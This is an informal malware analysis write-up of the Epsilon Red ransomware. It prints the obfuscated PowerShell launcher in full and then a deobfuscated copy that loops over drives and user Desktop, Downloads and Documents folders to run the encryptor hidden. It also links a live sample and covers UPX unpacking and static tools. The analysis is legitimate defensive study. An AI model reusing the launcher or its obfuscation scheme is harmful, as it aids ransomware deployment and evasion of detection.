# Epsilon Red Analysis

Yeah you heard right!!! This malware is named after the famous Epsilonred character in Marvel Comics xD.
This ransomware has been using and propagating recently discovered Microsoft Exchange servers exploits (CVE-2021-26855, CVE-2020-1472, and CVE-2021-27065) moreover.
Patch your exchange servers y'all, before they mess up your work.

So, I got my hand on some of it's executables and pwoershell script (Thanks to Malware bazaar :heart:)

Why dont we first start with the powershell script?

Upon first look the scripts looks like it has been obusfcated but I think homies at Epsilon red got tiered and simly put '[' ']' '{}--{}' '{}---{}---{}'.

```powershell
$a=@'

f[[[]][[][]][]]or[][][][[][][][[]]][[[][[]]]]([][]$[][][]i[][[]]=[][[]][][][]0;$[][][[][][]]i[] -[[]][]l[[]]t[] []4;[][][][[[[]]]][[]][][[[]][]]$[][][][][][][[][][[]][][][]][]i[][][[][]][[[]][]][]++[][[][[]]][])[]{[[]][]
[[][]][][[]][][]	[][[]][]$a[][[[]][[][[][]]][][]][][][]lp[]h[] =[][] [][[][]][][[]][[][]][][][[][[]]][[][[[][]]][][[][][]][[[][[][][]]][[]][]][][]]@[][[]][][][[][][][][]][]({}{}---{}{}[][[]][][[][]][][]Z[][[[][][]][][][[[[]][][][[]]][]]]{}{}---{}{},[[[]]][][][][] {}{}---{}{}Y[]{}{}---{}{}[[][]],[][] {}{}---{}{}X[]{}{}---{}{}[][],[][[][]][[]][[[[]]][[][[]][][[]][]][]][][[][]][]{}{}---{}{}[]W{}{}---{}{}[[][][[]]][], []{}{}---{}{}V[[][][[]][][][][]][[[]][][]]{}{}---{}{}[[][[[]]]],{}{}---{}{}[][][[]][][][[[]][[][[][][][[][]]]][]]U[][]{}{}---{}{}[], [[][[[]][]]][[[]][][]]{}{}---{}{}[][[]][[][[]][[]][]][][[]][][][]T[][][][]{}{}---{}{}[[[]]][[]][[]][],[] {}{}---{}{}[][][][][]S[[]]{}{}---{}{},[] [[][][[]][]][[][[[][]][]][][]][]{}{}---{}{}[]R{}{}---{}{},[][][][][][][][] [[[]]]{}{}---{}{}[][][][[]][[]][[]][[]]Q[[]]{}{}---{}{}[][],[][][] [][[][[]]][]{}{}---{}{}[][]P{}{}---{}{},[][] [][[][][][[]][]][[[]]]{}{}---{}{}O[][][][]{}{}---{}{}[[][]][], [[][][[[][]]][[]][][][]]{}{}---{}{}N[][]{}{}---{}{}[][[]][[]][[]][][[]][[]][[]],[[]][][[[][[][]]][][][]][[][[]][][[]]][]{}{}---{}{}[[]][[][][[[][[]][[]]]]]M[[][][][[[]]][][][[[]][][][[][]]][[]]][][][]{}{}---{}{}[][],[][[]][][[][][[]]][][[][][][]][] [][[[]][]][][][]{}{}---{}{}[][][[][][][[]][]][[[]][]]L[][][][]{}{}---{}{},[[]][][[]][][][[[]][][]][[[]]][[[][]]][[]][][] [][][][][][[]][][[][[]]][[]]{}{}---{}{}[]K{}{}---{}{},[][][][][]{}{}---{}{}[[][]]J[]{}{}---{}{},[][] [][]{}{}---{}{}I[]{}{}---{}{}[][][],[] [][[][]]{}{}---{}{}[[]][[[]][][[][][][]][]]H[][[[]][][]][[]]{}{}---{}{}[][],[[][]][[[]][]]{}{}---{}{}[]G[][][[]][[[][]][[][][][]][]]{}{}---{}{}[][][[][[[[[]]][][][][]]][[][][[]][[][][]]][][[][][][][[]]]][], [][[]][]{}{}---{}{}[]F[]{}{}---{}{},[[[][]][][[][[][]]][[]]][][[]][[]] {}{}---{}{}[][[][][][[]][]][[]]E[][]{}{}---{}{}[[[]]],[[[]]] [[]]{}{}---{}{}D[][][[]]{}{}---{}{}[][][][],[][[]] [[]][[]]{}{}---{}{}[[[]][]][]B[[][]][][][]{}{}---{}{}[[]][][],[][] [][[][]][[[][]][[]][]][[[]]][][][[][][]][[][][[]][][][]][]{}{}---{}{}[][][][][][[]][][]A[[]][][][[]][][[][]]{}{}---{}{}[[]][])[][][][][[[]]]
[][[][][][][][]][][][[][]][][]	f[[]][[]][[][[]][[][]][][][][[[]]][][]]o[][]re[][[]][[][]]ach[]($[][][][[][][[]][]][[]][][][][][]a[[][][][][][]] [[][][[][]]][][[[][]]][][][]i[][][][[]][[][][]]n[[[[][[]][]][]][][][][[][]]] [[]]$[[][]]a[[][[[[]][]][]]]l[]p[][][][][]h[][][][][[]][[[[]]]][][][][]) []{
[[]][][][]	[[]][][[][]][]	[][][]if[](([[][][]]T[[[]][[]][[]][[][][][][][]]][[[]]]e[[[]]][][][[][][[][]]][][][[][]][][][][[]][][[][[][][][][[]][]]][][][[][][][][][][[]][]][]st-[][]Pa[]t[[]]h[][][[][[]][[]]][][[][]][[][][][]][][[]][[][[[[]]]][]][[][][[][]][]][[][]][] [][[[]][][][][[[]][]][[]][[]]][[][][][][[[]]][]]-[][[]][[[][]][[][]][[[]][]]][[]][[][]][][[[][]][][]][]P[]at[[][][[]]][[]][][][]h [][[[]][][]][][][][]($[[][][][]][][][][]a[][]+[]{}{}---{}{}[][][[][]][]:\{}{}---{}{}[[][[[]]]])[[][][[][]][[][[]][]][[]]][][]) []-[]e[][][[]][[]][[]]q[] []$[[[]][][[][][][[]]]][[][]][][][][][[]]tr[[][][]][[][]]u[][][[]][][][][][]e[][[[][[]][][][]][][[[[][[]]]]][][][[][]][][]][][[]][])[[]][][][] {[[[][]]][][]
[[[][]][][]][]	[][]	[][][][[[]]][][][][][][[]][][][[]][][[][]]	[][][]S[][[][][][[][]]][]tart-P[][][][][[]][][]r[[][][][][][[][]][]][][[][][]][][][][]oc[][][][][][]es[][[]][][]s [[]][[]][[][[][]][][][][[][][[]]][][][[]]][[][][[]][[][][][]][[]][]][][[]][][[]]C[][][]:[[]][]\[[[][]][]][][[[][]]][][][][][[[][]][[]]]W[]i[][[]]n[]d[[]]o[][]w[[][]][][][][[]][][[]][][[]][][][[][][]][][][]s[[[]]]\Sy[][[]][[[]]][]st[][][]em[][][[[]][][[]][[]]][]32[[[][]][]][][][]\[[]]R[][]E[][[][]][][[][]][[]][]D[][]\[[][[][]][]]RE[[]]D[][][].[]ex[][][[]][[[]]]e[][][[]] [][][][[[]][][]]-W[]in[[]][[[]]][[][][[][]][]][[][][[]][][][][][][]][][][][][][][]d[][][[][][[]]][[]][][][]owS[[]]t[]y[][][[]][][[[][]]]l[[[][]][][][][][][][]][][][[]]e[[][]][] [][][][]Hi[][]d[][[]][[]][[][][[[]]][[]][][[][[][]]][[]]][]den[[[]][]] -[][][][][]A[][][][][]r[]g[[][]]u[][][][][]m[[][[][][][[]]]][]en[]tLi[]st ($[[]][[]]a[[][][[][]]][[][][]]+[][][]{}{}---{}{}:[][][[][]][][[][]]\[[][][][][][][][][[[]][][][][[]]][]][[]][[[]]][[][[][][]][[][][]]]{}{}---{}{})
	[[]][[]][][[]]	[][][[]][[[[]]]][[]][][][][][[]][[]]}
	}
[][]	[][[[]]]l[][[]]s c[][][][[[[]]]]:[[][]]\[[]] []|[] W[[][][[][[]][[][]]][]][]h[][][]e[]r[][][][][][[]]e[[][[]][[]][][[][]]]-[]O[][[]]b[][][]j[][[]]e[][[][[]]]c[[][][]][][][][][][[]]t [][[][][]]{[]$[][]_[[][][[][]]].[][][[]][[][]][[]]n[][][][][]ame[][][][[][]] [][]-[[]][][]n[[][][]]o[][][[][][][]][][][[]][][[][]][][[]][][[][][]][][[]][][][[][[[][]][[]][[]][][]][]][][[[]]][][][][][]t[][][][]m[]at[[][][[][]][][[[][]][][[]][][]][][][][][][][][]]c[][][][]h[][[]] [[][[]][]][[]]{}{}-{}{}[][[][][[[][]]]]w[][[[][[][]]][][]]in[[][]]d[][][][]o[]w[][]s[][]|[][[][][]]P[][]r[][[]][[][][]][][][][][][[[]]]og[[][]][[[][[][]][]]][[]][[][]][][][]r[][]am[][[[]][]][][][[][[][]]][]|[][[[]][[]][]][][][][][[]][][[]]us[][[][][]]e[][][][[[[][]]][]][][]rs[[][][][]][[]][][[]][]|dr[[]][]i[][[]][][[][[]]]v[[[]]]e[]r|b[[]][[]]o[][[[]]][][[[]][][[]][]][][][[[]][][][][][][[[]][][]][[]]][[][][]][[[]][[]]][][]o[][]t[]{}{}-{}{}[][[]][[]][[]]}[][[[][]][[]][][]][][[]][[[]]] |[] [[[][[]][[]][[]][]][][][]][][][[[][]]][]%[] [][][][][[[[]][][][]]]{[][]S[][]ta[]r[[][][[[]]]][]t[[]]-P[]r[[][]][]o[][][[][][]]c[][[][]][][][][]e[]s[][][][][]s[] C:[][][][][]\[]Wi[[][][]][[]][][][]nd[[[][[]][][]]][][]o[][]ws[]\[[][]][]S[][[][][][]][[[]]]y[][][][][[]]st[[]]e[][][[][[]]]m32\[[[][]]]R[[]][][][]ED[]\[[]]R[][][][][][[][[]]]ED[[][]][][].[][]e[[]][][][[[][]][[]]]x[][][][][][[]][][[[]][]][[]][][][][[][]]e [][[]][][]-[][[][[][]]][[][][[]][]]W[[][][][]][[][[]][][[]][]]i[]n[]d[[]][][][][[]][][]o[][]w[][[][[]]][[]][[][][]][[][[][]][][[[]]][][][[]]]St[]yle[[][]][[[]][][[]][]] H[]id[]d[]en[][][[]][][][[]][][[][][]][[]] -A[[[]]][[[]]][[[]][]][][][[]][][[][]][][[][][[]]][][][[][]][][[][]][[[]]][][][][[][[]][][[]]][[][][]][][[]][][][][]r[[]][][][]g[]um[][[]][[][][]][][[[]]][][]en[][][[]][]t[[][][]][][[]]L[[]][[][]][][[[]][]][][[][][[]][[]]][][][][[][[]]][[][[][[]][][[[[]][]]]]][]is[][]t[[]][][][][][[[]][]][[]][][[[]]] $_[[[]]][[]].[][]F[]u[[][[[[]]][]]][[][[]][[]][][[]]][]l[[]][[]][[]][]l[[]][][][][]Na[[][]]m[][]e[][][][]}[][][]
[[]][][[][]]	l[][][][][[[][][][][[[]]][][]][][[][[]]]][][][][][]s[][] []C[]:[[]][][[]][]\Us[[[]]][][][]e[][][[[][[]]][][]][]r[[][]][][]s[][]\[][[]][][][[][[[]]]]*\[][][[]][][][[]][[[[]]]][][[[]]][][]D[[][]][]es[[[]][][][]]k[[][[]][]][]t[[]][][[][][][][][[]]]o[][][[][]][[[][][][]][][[][]]][][][[]][[[]]]p[][][[]][[][]][] [][[][[[][[][]][[]][[]]]]][][][[][][]][[]]|[[[]][]][] %[[]][] []{S[][][[]][][][[][[]][[][]]][[]][[][]][]ta[]r[[][[]]][[][][[]]]t[[[]][]]-[][[]][][][][[][[]]][][[]][][[[][]]][][]P[][][][[][][][[]][][[[[]][[]]][[][]][][[]][]][][][][[[]]][][][[[][[]][][]][[]]][][]]roc[[]]e[][][[]][[][][][[]][][][][][][][][][]]s[[][[]]][]s[[][][]][][][][][] [][[][][]][][[][][][][][[[][[][][][][]][][[][]][[]]]][][][][][]][[][][][]][][][[][][[]]][[]]C[[[[][[]]]]][[]]:[[[]]][][][][][[]][][[]][[]][][[][[][][]][[][[]]]][][[[]][]][][][][[[]][]]\[[][]][[]]W[[][[][][]][][[[][[[]]][][[]][[]]][]]]i[][][[]][[]][][]n[]d[][][][][][][[][][[[]][][][][[]]][[][][][]]][[[][]]][]ow[]s[[]][][]\[][][][[]][]S[][][][]y[][][]s[[]]te[[]]m32[]\[[][][]][][[[[][][][]][][]]]R[[[][][]]][[]][[]][][][[]][]E[][[][][]][][[[]][[[]]][[]][]][[]]D\[][]R[]E[]D[[]][[]].e[[]][]x[][][[]][][][][]e []-[]W[]i[[[]][]][[]][[][[]]][][][[[]]]nd[[]][][][][[][][][]][[][][]][][]o[][[][][[[]][][[[]][]]][][[]][]][]wSty[]le[][][][] [][[][][][]][][][][[]][[]][]Hi[]d[[[][[]]]][[][][[]]]d[]e[[]][]n[] [][][[]][]-Ar[[]]gu[][]m[[][[][]]][[]][]e[][]nt[]Li[[]][]s[][]t [][[[[]]][]][]$[][]_[].[][][][[]][[]][][][][[]][][][][[]]F[]u[[]][]llN[[][[]][]][[][]][[]][[]][][][]a[[]]m[[[][]]]e[]}[[]][[]][[][]]
[]	l[][[]]s [[]][[][]]C[][][][]:[]\[[][]][][][]Us[]ers\[][[[]][][[][[][]][]]][][[]]*[[][][[][]][][][][][][][][[]][][][[[][]][]][]]\[]D[][]o[[]][[]]w[][[]][][]n[[]][[][]][][][[[]]][][]lo[[[][]][][][[]]][][[]][[[]][[][[]]]][]a[]d[[][[[][]][][]][]][][[][]][][][][[]][]s[][[][][][[]][]] [][[]]|[][] [][][[]][][][][][[[][]][][]][]%[[]][[]] [[][][][[][]]]{[][]St[[]][][]a[][[]][]r[][][]t[][][][][[[[[][][]][]][][][][][][[]][[]]][][][][[[]][]][[[]]][]][][[][]]-Pr[[][][]][[]]o[][][][][]ce[]s[][][][[][]]s [[[]][]][[]][][][[[[][]][][][[]]]][[][]][]C[][][[]][][][][][[][][][][][]][[]][[][]][][[]][[]][]:[][][[]]\[]W[][][[]]in[[]][][[]][][]d[][[][]]ow[[]][[[]]][]s[][[][][]][][][][][][][[][[]][]][[][[[[]]]][]][][][][[]][]\S[[[][]][[[[]]]][][]][][[][]]y[]s[[][][][[]][[]][]]t[[[]]]em[][[]][[]][][[]][][][[]][[]][][][[]][][]3[][][[]][][]2[][[[[]]][][][]][[[]]]\[[]][]R[[]]E[[[]][][[]][[][]][][]][][][]D\RE[]D[].[][]ex[[]][][[[[]][]][]][][][][][]e[[]] [[]][[]][][]-Wi[[][[]]][[][][][][][][][][]][]n[[]][]d[][[[[]][][][]][[][]]][[][][]][[][][]][][]o[[][][]][][][]wSty[[][[][][]][[][]]][]l[[]]e[[]][][] [][[]][[[]]][[][]]H[[[]]][]i[][[][][[[]]][]][[[][]][[][]][[][][][[][]]][]][]d[][][]d[][[]][[][[[]]][]]en[[][]] [[[][]]][]-A[][[[]][]][][[]][]rg[[]]u[[][]][[[]]][]m[[]][]ent[][]L[][][[[]][][]][[]]i[][[]]s[][[[]]]t[[[][]][]][] $[][[]]_[][[][][][]][[][][]].Fu[[]]l[][]l[][[]]Na[][][[]][[][]][[]][[[][][[[]]]][[][]][]][][]m[[][]]e}[]
[][[][]][][][]	[][]ls[[][][[]]] C[[]][[]][][]:[]\[[][][[[[]][][][]][[][][]][][[][]]][][]][]U[[]][][][[]][][[]][[][][][]]s[]e[][][][[[[]]]]rs[[][[][]]][]\[][[]][[]]*[[[]]][]\D[][]o[[]][[]][]c[][][[][]][]u[[]]m[]e[][[][]][[[][][]]][][[][[]][]]n[][]t[][]s[][[]] |[[]][[]] [[][][][][[]][[][]][[[[[]][]]]][][][][[]][][]]%[[]][][[][][][[][[[]][[]]]]][[][][[[]]]][] {[][]St[[][][][]][[][[][]]][][]a[][][][][]rt[[][[]][[][]]][][]-[]P[[]][[[[]][[]][][]][]]r[][][[]]oc[]es[][][][][[[]][][]][][][[]][]s[][][] [][][[[]][]][[][][]][]C[[][]][][[][]][][[]][]:\[[[[][]][]]][[][][]][][][]W[[[]][[][][[][]][]][[][]][[]][]]i[[]][][]n[[[][]]][[]][][[]][][[[]][]][][[]]d[][[][][][][]]o[][][][[][[][][]][[]]][][[]][[][[[[]]]][[[][][]][]][][[]][]][[][]][][]w[][[]][[[]]][][][]s\[][][[]][][][]Sy[]st[][[[][]][][][]][][][[]][][[[]]][]em3[][][]2[[][]][]\[[]][[[]]]R[]E[]D[[[][]]][][[]][[][][]]\[]RE[][[]]D[][][[][[]][][]][[]][[]][].[][[[]]][[[][][][[][]][]]][][][][][][][[[[]]][]][[]][][[[]]][]exe[][] [][[][[]]][][][]-Wi[[][]]n[][][][][[][]][[[]]][][[]][][[]]d[][]o[][[][][][]][[]]w[][][[][]][][][][[[[]]][[[][]]]][]S[][[][][][][][[]]][][][]t[[[[[][][]][][[][[]][][]][]][[]]][]]yl[][][][][[]]e[][][][][][[][]][][[[]]][[[][[]]]] [[][][[]]][]H[[]]i[][[]][[]][]d[[][][]][][[][[]]][[][][][][[]]][][[[[][]]][][][[]][][][[][]]][[]][[]][][[][][][][[]]]d[[][][][][[][]]][[][]][][][]en -[[[][[]]][]]A[][]rg[]u[[[][]][]][][[[]]]m[[][][[][]]][[][][[]][][]][][[][[][[[[]]]]][][[]][]][[][][][]]en[][][][[[]][[]]][[]][[]]t[[][]][]L[[]]i[][]st[][][][[]] [[[[]]]][[[[]]]]$_.F[][][][][][][[[]]][][][][[][][][[]]][[][[][]]][][[]][][][[][][][]][[][]][][][][[][][][]][][[][][[]][[]]]u[][]l[[][][]][[]][[]]l[]N[][[[]]][]a[][][][][[][][[]][][][]][]m[]e[][][[[]]]}[]
[[[][]][[]]][]	[]S[][[][][][][]][[][]][][][[][[[]]]]t[[][][][[]][[]][]][[][]]a[][[[[]]]]r[][][[][]][[]]t[[[][]][[]][[][[]][][[][][][]][[[]][][[[]]]]][[][]][][[][]][][]][][]-[][[]][][[]][][[[]]][]Sl[][]e[][][]ep[[][]] -S[][][][][[]][][]e[]co[[[]][][][][]]n[][][][]d[][[]][[][[]]][[][]][][[[]]][][][]s [][][[][[]][]][][[]]3[][][]00[]
[]}[[]][][[[][[][]][][][]]][][][][[][[]][]][][][][[][[][]]][[][]]
'@
$a=$a.Replace('[','');$a=$a.Replace(']','');$a=$a.Replace('{}{}-{}{}','"');$a=$a.Replace('{}{}---{}{}',"'");iex($a);
```

So simply removing the extraneous char's we will get the Powershell (unobfustacted xD).

```powershell
$a=@'

for($i=0;$i -lt 4;$i++){
	$alph = @(Z, Y, X,W, V,U, T, S, R, Q, P, O, N,M, L, K,J, I, H,G, F, E, D, B, A)
	foreach($a in $alph) {
		if((Test-Path -Path ($a+:\)) -eq $true) {
			Start-Process C:\Windows\System32\RED\RED.exe -WindowStyle Hidden -ArgumentList ($a+:\)
		}
	}
	ls c:\ | Where-Object {$_.name -notmatch windows|Program|users|driver|boot} | % {Start-Process C:\Windows\System32\RED\RED.exe -WindowStyle Hidden -ArgumentList $_.FullName}
	ls C:\Users\*\Desktop | % {Start-Process C:\Windows\System32\RED\RED.exe -WindowStyle Hidden -ArgumentList $_.FullName}
	ls C:\Users\*\Downloads | % {Start-Process C:\Windows\System32\RED\RED.exe -WindowStyle Hidden -ArgumentList $_.FullName}
	ls C:\Users\*\Documents | % {Start-Process C:\Windows\System32\RED\RED.exe -WindowStyle Hidden -ArgumentList $_.FullName}
	Start-Sleep -Seconds 300
}
'@
$a=$a.Replace('','');$a=$a.Replace('','');$a=$a.Replace('','"');$a=$a.Replace('',"'");iex($a);
```

So, you can see it first iterates through and finds all the disks and then executes the RED.exe which is in System32 that was previously dropped onto the system.

Now we are done with the Powershell. Let's have a look into the executable the payload.

You can find the sample at [Bazaar Abuse](https://bazaar.abuse.ch/download/f0eb8d56321e91fecf216ea9131a0f91c4b65c415f28ab74a1eadd619f5a89ee/)

Sample hash - f0eb8d56321e91fecf216ea9131a0f91c4b65c415f28ab74a1eadd619f5a89ee

So lets start with little bit on file information. Lets load it in DiE.exe

![Die_info](DiE.PNG)
You can see this particular executable is packed using UPX packers. So, let's if we can unpack the sample using UPX which would tell if there was any effort put into packing this malware.

![cmder_unpacked](Unpaked_cmd.PNG)

Interesting this say we have unpacked the malware??? Didnt expect that it would be this easy xD(As most of the packed malwares that I have delt with didnt simply unpack with UPX gracious epsilonred dev's :kissing_closed_eyes:)

Hash of the unpacked sample is...

SHA - 4A4D13D492F22DA6D0158A4D7C78A48033B330B6

So now lets load it in Pestudio and have a look at the file more deeper info...

![pestudio_info](Epsilon Red\pestudio_info.PNG)

Now lets have a look at the no of Virus Total hits...
![VT_hits](VT_hits.PNG)
Hmmm... 34/70 (So, it looks like it is already out there)

Lets have alook into the Lib's and Dll's, API's and func's imported...
![Libs](Libs_imported.PNG)
![imports](Imports_fa.PNG)
BTW the list is sorted in accordance to suspicous and dangerous categorey.

Let's have a look into the Strings and they have been sorted in accordance to sus list.
![Strings](Strings.PNG)

Long story short my potato head PC couldnt handle the disassembly using cutter and it literally crashed twice...
For dynamic analysis part the PowerShell script runs the malware in hidden state to avoid detection and the both the packed and unpacked exec I think it was looking for exchange exploit and my machine was Win10 home edition. So, I have to get to know about exchange and if possible I will try to configure it into my home lab and might mess around.
